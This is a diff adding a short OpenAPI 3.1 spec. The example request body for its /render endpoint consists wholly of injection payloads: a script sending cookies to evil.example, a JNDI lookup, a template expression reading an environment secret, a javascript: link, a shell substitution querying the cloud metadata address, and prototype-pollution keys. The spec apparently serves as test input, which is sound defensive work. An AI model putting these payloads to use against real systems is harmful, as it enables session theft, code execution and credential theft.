@@ -1,0 +1,26 @@
+{
+  "openapi": "3.1.0",
+  "info": { "title": "Examples", "version": "1" },
+  "paths": {
+    "/render": {
+      "post": {
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "example": {
+                "html": "<script>fetch('https://evil.example/?c='+document.cookie)</script>",
+                "template": "${jndi:ldap://evil.example/a}",
+                "expression": "={{ $env.SECRET }}",
+                "link": "javascript:alert(1)",
+                "shell": "$(curl http://169.254.169.254/latest/meta-data)",
+                "protoText": "__proto__",
+                "nested": { "constructorName": "constructor" }
+              }
+            }
+          }
+        },
+        "responses": { "200": { "description": "ok" } }
+      }
+    }
+  }
+}
